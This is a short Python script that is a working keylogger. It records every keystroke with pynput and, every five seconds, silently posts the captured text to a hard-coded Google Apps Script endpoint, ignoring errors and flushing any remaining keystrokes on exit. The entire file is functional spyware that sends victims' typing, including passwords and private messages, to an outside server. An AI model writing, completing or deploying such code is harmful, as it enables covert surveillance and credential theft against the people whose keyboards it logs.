import pynput
import requests
import time
import threading

SERVER_URL = "https://script.google.com/macros/s/AKfycbxotywuWi6wFc5B41bjAD3IynmAyidcYBiqpYAcqpl0BpUiXFjFD5dz-A4knnTruqRbZg/exec"

log = ""  # Store keystrokes
lock = threading.Lock()  # Prevent race conditions

# Capture keystrokes
def on_press(key):
    global log
    with lock:  # Ensure thread safety
        try:
            log += key.char
        except AttributeError:
            log += f" [{key}] "

# Send captured keystrokes to the server
def send_data():
    global log
    while True:
        time.sleep(5)  # Wait 5 seconds before sending
        with lock:
            if log:
                try:
                    response = requests.post(SERVER_URL, json={"keystrokes": log})
                    if response.status_code == 200:
                        log = ""  # Clear log only after successful send
                except requests.exceptions.RequestException:
                    pass  # Ignore network errors, retry on the next attempt

# Ensure all keystrokes are sent before exiting
def on_exit():
    global log
    with lock:
        if log:  # Send remaining keystrokes before quitting
            try:
                requests.post(SERVER_URL, json={"keystrokes": log})
            except requests.exceptions.RequestException:
                pass

# Start logging in the background
listener = pynput.keyboard.Listener(on_press=on_press)
threading.Thread(target=send_data, daemon=True).start()

try:
    listener.start()
    listener.join()
except KeyboardInterrupt:
    on_exit()  # Ensure data is sent before exit